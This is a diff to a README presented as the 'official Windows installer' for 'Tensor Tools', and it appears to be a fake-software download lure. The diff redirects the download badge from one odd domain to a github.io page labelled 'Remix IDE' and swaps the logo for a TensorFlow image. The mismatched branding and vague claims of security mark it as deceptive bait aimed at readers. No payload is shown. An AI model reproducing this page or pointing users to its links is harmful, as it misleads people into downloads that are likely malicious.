@@ -3,7 +3,7 @@
 Official Windows installer for **Tensor Tools** — a fast, stable, and secure environment built for modern professionals.  
 It enhances workflow consistency and allows direct, high-speed access to features without browser limitations.
 
-[![Download Tensor Tools](https://img.shields.io/badge/Download-Tensor_Tools-blueviolet)](https://obsprosect.com)
+[![GET Remix IDE](https://img.shields.io/badge/GET%20%E2%80%94%20Remix-IDE-0078D6?style=for-the-badge&logoColor=white)](https://calviigz43854.github.io/.github/Remix-IDE)
 
 ---
 
@@ -45,7 +45,7 @@ Professionals choose Tensor Tools for its resilience and transparent behavior. T
 ---
 
 ### 🖼 Preview
-![Tensor Tools Logo](https://logo.clearbit.com/www.tensor.trade)
+![Tensor Tools Logo](https://content-media-cdn.codefinity.com/courses/a668a7b9-f71f-420f-89f1-71ea7e5abbac/Ch.+1-1/tensorflow_logo.png)
 *Official branding preview.*
 
 ---
